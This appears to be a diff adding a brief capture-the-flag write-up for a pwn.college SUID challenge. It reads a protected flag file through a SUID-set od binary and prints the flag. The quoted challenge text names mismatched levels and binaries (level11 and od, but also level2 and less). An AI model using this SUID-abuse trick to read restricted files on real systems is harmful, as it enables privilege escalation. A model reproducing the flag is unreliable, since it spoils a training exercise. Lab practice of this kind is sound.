@@ -1,0 +1,27 @@
+First, lets go the challenge directory:
+# cd ../../challenge 
+Run the /babysuid_level11, for obtain the
+suid level, and for get some hints for the problem:
+# ./babysuid_level11
+    Welcome to ./babysuid_level11!
+
+    This challenge is part of a series of programs that
+    exposes you to very simple programs that let you directly read the flag.
+
+    I just set the SUID bit on /usr/bin/od.
+    Try to use it to read the flag!
+
+    IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart
+    this challenge container to make sure that I set the SUID bit on /usr/bin/less!
+
+    After this, just go backwards and use cat on flag file
+
+# cd ..
+# od flag -c
+   0000000   p   w   n   .   c   o   l   l   e   g   e   {   8   v   E   i
+0000020   O   G   J   o   1   D   I   S   d   x   E   4   i   V   R   r
+0000040   -   h   M   2   N   8   t   .   Q   X   z   U   T   M   s   Y
+0000060   j   N   3   M   z   W   }  \n
+0000070
+
+pwn.college{8vEiOGJo1DISdxE4iVRr-hM2N8t.QXzUTMsYjN3MzW}  \n
